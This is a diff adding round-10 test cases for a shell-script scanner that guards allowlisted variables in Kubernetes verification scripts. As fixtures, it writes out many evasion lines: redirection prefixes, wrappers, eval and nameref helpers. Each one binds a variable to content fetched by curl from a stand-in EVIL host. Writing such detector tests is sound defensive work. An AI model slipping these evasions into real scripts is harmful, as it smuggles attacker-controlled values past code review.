@@ -5,6 +5,8 @@ import { tmpdir } from 'node:os';
 import { dirname, join, normalize } from 'node:path';
 import { parse } from 'yaml';
 import {
+  commandHead,
+  dynamicNameWrites,
   REMOTE_FETCH_ALLOWLIST,
   STATEMENT_ALLOWLIST,
   unsafeApplies,
@@ -952,6 +954,118 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     }
     cases['declare -n'] = `${STRICT}declare -n R=V\necho "$R" | kubectl apply -f -\n`;
     expectAllFlagged(cases);
+  });
+
+  // ---- #1410 round 10: the COMMAND word is found after any prefix, and a helper that binds a
+  // name it is GIVEN is a run-time-name write --------------------------------------------
+  //
+  // Round 9 took the first word of a simple command as its command, so a leading redirection
+  // (`2>/dev/null read V`), `time -p`, or `>&2` hid a `read`; and a helper body that binds
+  // `"$1"` (`printf -v "$1"`, `local -n r="$1"`, `read -r "$1"`) was one word headed by
+  // `f()`, so `setv STATIC_LSN "$(curl …)"` wrote the variable with no trace. Each line below,
+  // inserted into the real allowlisted file with the statement untouched, must red its
+  // SOURCE check specifically.
+  const R10_WRITERS: Record<string, string> = {
+    // the reviewer's four real-file greens
+    'M1 `2>/dev/null read`': `2>/dev/null read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'M2 helper `printf -v "$1"`': `setv() { printf -v "$1" %s "$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'M3 helper `local -n r="$1"`': `sv() { local -n r="$1"; r="$(curl -fsSL ${EVIL})"; }\nsv STATIC_LSN`,
+    'M5 `time -p read`': `time -p read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    // the reviewer's scanner-only greens: the redirection-prefix class
+    '`>&2 read`': `>&2 read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    '`0<f read`': '0</tmp/lsn read -r STATIC_LSN',
+    '`IFS= <f read`': 'IFS= </tmp/lsn read -r STATIC_LSN',
+    '`< f read` (bare operator)': '< /tmp/lsn read -r STATIC_LSN',
+    '`curl -o f` then `<f read`': `curl -fsSL -o /tmp/lsn ${EVIL}\n</tmp/lsn read -r STATIC_LSN`,
+    '`&>/dev/null read`': `&>/dev/null read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    '`if ! 2>/dev/null read`': `if ! 2>/dev/null read -r STATIC_LSN < <(curl -fsSL ${EVIL}); then :; fi`,
+    // the name-passed-to-a-helper class, every body shape
+    'multi-line helper `read -r "$1"`': `rd() {\n  read -r "$1"\n}\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'multi-line helper `printf -v "$1"`': `setv() {\n  printf -v "$1" %s "$2"\n}\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'multi-line helper `local -n r="$1"`': `sv() {\n  local -n r="$1"\n  r="$(curl -fsSL ${EVIL})"\n}\nsv STATIC_LSN`,
+    '`function` keyword helper': `function rd { read -r "$1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'helper `read` in a `case` arm': `rd() {\n  case x in\n    x) read -r "$1" ;;\n  esac\n}\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'helper `IFS=, read -r -a "$1"`': `ra() { IFS=, read -r -a "$1"; }\nra STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'helper `builtin printf -v "$1"`': `setv() { builtin printf -v "$1" %s "$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'helper `: "${!1:=$2}"`': `setv() { : "\${!1:=$2}"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'helper `eval "$1=…"`': `setv() { eval "$1=\\$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'nameref declared, target bound later': `declare -n r; r=STATIC_LSN; r="$(curl -fsSL ${EVIL})"`,
+    // wrappers and non-literal command words
+    '`command -p read`': `command -p read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    '`env IFS= read`': `env IFS= read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'a brace-expanded command word': `{read,-r} STATIC_LSN < <(curl -fsSL ${EVIL})`,
+  };
+  for (const [name, line] of Object.entries(R10_WRITERS)) {
+    it(`round 10: ${name} writing an allowlisted statement's variable reds the source pin`, () => {
+      expect({
+        name,
+        pinned: r9Inject(
+          `${D}_verify-objstore.sh`,
+          R9_OBJSTORE_ANCHOR,
+          line,
+          'lsn-inject-objstore',
+        ),
+      }).toEqual({ name, pinned: true });
+    });
+  }
+
+  it('round 10: the command word is found after redirections, assignments, keywords and wrappers', () => {
+    for (const [seg, head] of [
+      ['2>/dev/null read -r V', 'read'],
+      ['< f read V', 'read'],
+      ['>&2 IFS= 0<f read V', 'read'],
+      ['{fd}<f read V', 'read'],
+      ['time -p read V', 'read'],
+      ['command -pv builtin read V', 'read'],
+      ['env -i -u X K=V nohup exec -a n read V', 'read'],
+      ['! if { ( read V', 'read'],
+      ['jq -r . f', 'jq'],
+    ])
+      expect({ seg, head: commandHead(seg.split(' '))[0] }).toEqual({ seg, head });
+  });
+
+  it('round 10: a helper that binds a name it is given is a run-time-name write, in any body shape', () => {
+    for (const body of [
+      'f() { read -r "$1"; }',
+      'f() {\n  read -r "$1"\n}',
+      'function f { printf -v "$1" %s x; }',
+      'function f() {\n  local -n r="$1"\n}',
+      'f() ( mapfile -t "$1" )',
+      'f() { 2>/dev/null read -r "$1"; }',
+      'f() { declare -n r; r=$1; }',
+    ])
+      expect({ body, dynamic: dynamicNameWrites(body).length > 0 }).toEqual({
+        body,
+        dynamic: true,
+      });
+    // A helper that only READS its argument, or binds a literal name, is not one.
+    for (const body of [
+      'f() { echo "$1"; }',
+      'f() {\n  read -r V\n}',
+      'f() { local -n r=V; }',
+      'f() { printf "%s\\n" "$1" >&2; }',
+    ])
+      expect({ body, dynamic: dynamicNameWrites(body).length > 0 }).toEqual({
+        body,
+        dynamic: false,
+      });
+  });
+
+  it('round 10: a redirection prefix on a NON-binding command is still not a write', () => {
+    for (const line of [
+      "2>/dev/null jq -r --arg STATIC_LSN x '.a' /dev/null >/dev/null || true",
+      '>&2 info "STATIC_LSN is the restored LSN"',
+      'log() { printf "%s\\n" "$1" >&2; }\nlog STATIC_LSN',
+    ])
+      expect({
+        line,
+        pinned: r9Inject(
+          `${D}_verify-objstore.sh`,
+          R9_OBJSTORE_ANCHOR,
+          line,
+          'lsn-inject-objstore',
+        ),
+      }).toEqual({ line, pinned: false });
   });
 
   // ---- #1410 round 5, finding 3: pinned versions fail fast, by name --------
